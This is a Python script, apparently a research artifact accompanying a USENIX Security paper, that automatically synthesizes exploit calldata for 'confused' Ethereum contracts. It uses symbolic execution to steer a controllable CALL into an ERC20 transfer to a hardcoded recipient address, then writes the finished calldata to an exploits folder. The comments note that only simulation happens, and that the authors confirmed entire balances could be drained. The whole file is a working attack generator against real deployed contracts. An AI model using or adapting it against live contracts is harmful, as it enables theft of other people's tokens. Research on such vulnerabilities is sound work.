
import os
import sys
import tempfile
import datetime
import json
import logging
import time
import argparse
import web3
import sys

from greed.solver.shortcuts import *
from greed.exploration_techniques import ExplorationTechnique, DirectedSearch, HeartBeat, Prioritizer
from greed import Project
from greed import options
from greed.utils.extra import gen_exec_id
from greed.TAC.base import TAC_Statement

from myglobals import *
from myutils import *

'''
This script implements the automatic exploit generator as explained in Section 4.4 of the paper
https://www.usenix.org/conference/usenixsecurity23/presentation/gritti.

This tools automatically syntethizes the calldata necessary to control the AA call in a confused contract,
point it to an ERC20 contract of choice (i.e., contract_target) and call the function of choice (i.e., function_target_sig, which usually is transfer(address,uint256)).
Then, it finds a STOP or RETURN statement to conclude the transaction and generate the exploit.
By default, the received of the "stolen" ERC20 is 0x76cf6361F21dB7A36eAa88649FEeBD9F18d94647 and only 1 token is transfered.
For all the exploits we presented in the paper, we actually manually verify we can transfer EVERYTHING.

The scripts will output the calldata in the folder ./exploits/.

NOTE: the script does NOT actually run the exploit on-chain, everything is simulated within our sym-executor.

<<IMPORTANT NOTE>>
 - User Responsibility: You acknowledge that you are solely responsible for the consequences of using this tool. 
                        SecLab shall not be liable for any actions taken or decisions made based on the use of this tool.
<</IMPORTANT NOTE>>


E.g. (make sure you run the run.py in CheckConfusedContracts folder)
  python gen_exploit.py 0xeC55Bf7E10b6594874554BAd1B461214Cab413d4 --aa_call_id 0x9f7 --contract_target 0x6B175474E89094C44Da98b954EedeAC495271d0F --function_target_sig 0xa9059cbb --block 11469710 --entry_point 0xcbd8c06a

'''

if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    # The confused contract address
    parser.add_argument("target", type=str, action="store", help="Confused Contract address")
    # The tac id of the controllable CALL in the confused contract
    parser.add_argument("--aa_call_id", type=str, action="store", help="AA call id")
    # The address of the contract target (ERC20 contract)
    parser.add_argument("--contract_target", type=str, action="store", help="address of the targetContract we want to call into")
    # The function you want to call in the contract target (generally transfer(address,uint256))
    parser.add_argument("--function_target_sig", type=str, action="store", help="function id of the targetFunction we want to call into")
    # The block at which you want to execute the exploit
    parser.add_argument("--block", type=str, action="store", help="block at which we are running the analysis")
    # From where you want to start the analysis (generally the entry point of the function that contains the AA call)
    parser.add_argument("--entry_point", type=str, action="store", help="function entry point used to reach the call")

    args = parser.parse_args()

    # contract that has a function with a controllable call (AA call)
    contract_addr = args.target
    # AA call
    call_target_id = args.aa_call_id
    # targetContract we want to call into
    contract_target_addr = args.contract_target
    # targetFunction we want to call into
    function_target_addr = args.function_target_sig

    block = args.block

    target_dir = os.path.join(WORKDIR, contract_addr[0:5], contract_addr)

    if not os.path.exists(target_dir):
        print(f"Folder {target_dir} does not exist")
        sys.exit(1)
    else:
        print(f"Opening contract in {target_dir}")

    project = Project(target_dir=target_dir)

    p = project

    options.GREEDY_SHA = True
    options.LAZY_SOLVES = False
    options.STATE_INSPECT = False
    options.MAX_SHA_SIZE = 300
    options.OPTIMISTIC_CALL_RESULTS = True
    options.DEFAULT_EXTCODESIZE = True
    options.DEFAULT_CREATE2_RESULT_ADDRESS = True
    options.DEFAULT_CREATE_RESULT_ADDRESS = True
    options.MATH_CONCRETIZE_SYMBOLIC_EXP_EXP = True
    options.MATH_CONCRETIZE_SYMBOLIC_EXP_BASE = True

    last_block = int(block,10)
    block_info = p.w3.eth.get_block(last_block)

    call_stmt = p.statement_at[args.aa_call_id]

    print(f"Trying to reach CALL {call_stmt}")

    function_target = args.entry_point
    calldata = function_target
    calldata_size = 1024

    # Let's set the CALLER to my account
    init_ctx = {
                "CALLDATA": calldata,
                "CALLDATASIZE": calldata_size,
                "CALLER": "0x0955E5f252BDA72d4823Fd7940BFE016510D37D0",
                "ORIGIN": "0x0955E5f252BDA72d4823Fd7940BFE016510D37D0",
                "ADDRESS": args.target,
                "NUMBER": last_block,
                "DIFFICULTY": block_info["totalDifficulty"],
                "TIMESTAMP": block_info["timestamp"]
                }

    xid = gen_exec_id()

    entry_state = p.factory.entry_state(xid=xid,
                                        init_ctx=init_ctx,
                                        partial_concrete_storage=True)

    simgr = p.factory.simgr(entry_state=entry_state)

    directed_search = DirectedSearch(call_stmt)
    simgr.use_technique(directed_search)

    prioritizer = Prioritizer(scoring_function=lambda s: -s.globals['directed_search_distance'])
    simgr.use_technique(prioritizer)

    heartbeat = HeartBeat(beat_interval=100, show_op=True)
    simgr.use_technique(heartbeat)

    print(f"Symbolically executing to CALL at {call_stmt.id}")
    print(f"Starting time: {datetime.datetime.now()}")

    found_call = False

    while True:
        simgr.run(find=lambda s: s.curr_stmt.id == call_stmt.id)

        print(simgr)

        if len(simgr.found) == 1:
            print(f"✅ Found state for CALL at {call_stmt.id}!")
            state = simgr.one_found

            if not state.solver.is_sat():
                print(f"❌ Found state is UNSAT :(")
                simgr.found.pop()
                continue

            print(f"Setting arguments for AA CALL...")

            # STEP1: set the arg size different == 68 
            print(f"  Setting arg size == 68")
            state.add_constraint(Equal(state.registers[state.curr_stmt.arg5_var], BVV(68,256)))
            #state.add_constraint(BV_UGT(state.registers[state.curr_stmt.arg5_var], BVV(280,256)))
            if not state.solver.is_sat():
                print(f"❌ Found state is UNSAT after setting argSize != 0 :(")
                simgr.found.pop()
                continue

            # STEP2: force to call the contract target
            print(f"  Setting target contract ")
            state.add_constraint(Equal(state.registers[state.curr_stmt.arg2_var], BVV(int(contract_target_addr,16),256)))
            if not state.solver.is_sat():
                print(f"❌ Found state is UNSAT after setting targetContract :(")
                simgr.found.pop()
                continue

            # hardcoded, I assumed that if we can transfer 1, we can transfer everything :)
            # NOTE: for all the exploits we presented in the paper, we actually manually verify
            # we can transfer EVERYTHING.
            payload = '00000000000000000000000076cf6361f21db7a36eaa88649feebd9f18d946470000000000000000000000000000000000000000000000000000000000000001'

            memory_at_call = int(function_target_addr + payload,16)
            memory_size_in_bits = 8 * (4+len(payload)//2)
            print(f"Payload size in bits {memory_size_in_bits}")
            print(f"  Setting payload in memory ")

            state.add_constraint(
                                Equal(state.memory.readn(state.registers[state.curr_stmt.arg4_var], BVV(4 + len(payload)//2,256)), BVV(memory_at_call,memory_size_in_bits)
                                    )
                                )

            if not state.solver.is_sat():
                print(f"❌ Found state is UNSAT after setting targetFunction in memory :(")
                simgr.found.pop()
                continue

            print(f"  Setting value == 0 ")
            value = state.solver.eval(state.registers[state.curr_stmt.arg3_var])
            state.add_constraint(Equal(state.registers[state.curr_stmt.arg3_var], BVV(0,256)))
            if not state.solver.is_sat():
                print(f"❌ Found state is UNSAT after setting value == 0 :(")
                simgr.found.pop()
                continue

            print("AA_CALL setupped correctly!")
            found_call = True

            break

        if len(simgr.found) == 0:
            break

    # Now, we want to automatically reach a STOP or RETURN to conclude the transaction.
    if found_call:

        all_stops = set()
        for func in project.function_at.values():
            stops = [s for block in func.blocks for s in block._statement_at.values() if s.__internal_name__ == "STOP"]
            for stop in stops:
                all_stops.add(stop)

        # Try to reach the first reachable stop and call it a day
        for stop_stmt in all_stops:
            block_stop = project.block_at[stop_stmt.block_id]
            # is it reachable from here?
            res = directed_search._is_reachable(state, block_stop, project.factory, project.callgraph)[0]
            if not res:
                # check next stop!
                continue
            else:
                simgr = p.factory.simgr(entry_state=state)
                directed_search = DirectedSearch(stop_stmt)
                simgr.use_technique(directed_search)

                prioritizer = Prioritizer(scoring_function=lambda s: -s.globals['directed_search_distance'])
                simgr.use_technique(prioritizer)

                heartbeat = HeartBeat(beat_interval=1, show_op=True)
                simgr.use_technique(heartbeat)

                print(f"Symbolically executing to STOP at {stop_stmt.id}")
                print(f"Starting time: {datetime.datetime.now()}")

                found_transfer_call = False
                while True:
                    simgr.run(find=lambda s: s.curr_stmt.id == stop_stmt.id)

                    if len(simgr.found) == 1:
                        print(f"✅ Found state for STOP at {stop_stmt.id}!")
                        state = simgr.one_found

                        if not state.solver.is_sat():
                            print(f"❌ Found state is UNSAT :(")
                            simgr.found.pop()

                        if len(state.sha_observed) > 0:
                            shas = state.sha_resolver.fix_shas()
                            print(f'Fixed {len(shas)} shas in the state!')
                        
                        exploit = state.solver.eval_memory(state.calldata, BVV(1024,256))
                        print(f'🔥🔥🔥 Exploit generated! {bcolors.WARNING}{exploit}{bcolors.ENDC} 🔥🔥🔥')
                        exploit_name = contract_addr + "_" + call_target_id
                        with open("./exploits/" + exploit_name, "w") as f:
                            f.write(f"{exploit}\n")
                        sys.exit(0)

        # if STOP didn't work, let's try with RETURN
        all_returns = set()
        for func in project.function_at.values():
            returns = [s for block in func.blocks for s in block._statement_at.values() if s.__internal_name__ == "RETURN"]
            for _return in returns:
                all_returns.add(_return)

        # Try to reach the first reachable stop and call it a day
        for stop_stmt in all_returns:
            block_stop = project.block_at[stop_stmt.block_id]
            # is it reachable from here?
            res = directed_search._is_reachable(state, block_stop, project.factory, project.callgraph)[0]
            if not res:
                # check next stop!
                continue
            else:
                simgr = p.factory.simgr(entry_state=state)
                directed_search = DirectedSearch(stop_stmt)
                simgr.use_technique(directed_search)

                prioritizer = Prioritizer(scoring_function=lambda s: -s.globals['directed_search_distance'])
                simgr.use_technique(prioritizer)

                heartbeat = HeartBeat(beat_interval=1, show_op=True)
                simgr.use_technique(heartbeat)

                print(f"Symbolically executing to STOP at {stop_stmt.id}")
                print(f"Starting time: {datetime.datetime.now()}")

                found_transfer_call = False
                while True:
                    simgr.run(find=lambda s: s.curr_stmt.id == stop_stmt.id)

                    if len(simgr.found) == 1:
                        print(f"✅ Found state for STOP at {stop_stmt.id}!")
                        state = simgr.one_found

                        if not state.solver.is_sat():
                            print(f"❌ Found state is UNSAT :(")
                            simgr.found.pop()

                        if len(state.sha_observed) > 0:
                            shas = state.sha_resolver.fix_shas()
                            print(f'Fixed {len(shas)} shas in the state!')
                        
                        exploit = state.solver.eval_memory(state.calldata, BVV(1024,256))
                        print(f'🔥🔥🔥 Exploit generated!{bcolors.WARNING}{exploit}{bcolors.ENDC} 🔥🔥🔥')
                        exploit_name = contract_addr + "_" + call_target_id
                        with open("./exploits/" + exploit_name, "w") as f:
                            f.write(f"{exploit}\n")
                        sys.exit(0)

        print(f"❌ No reachable STOP found :(")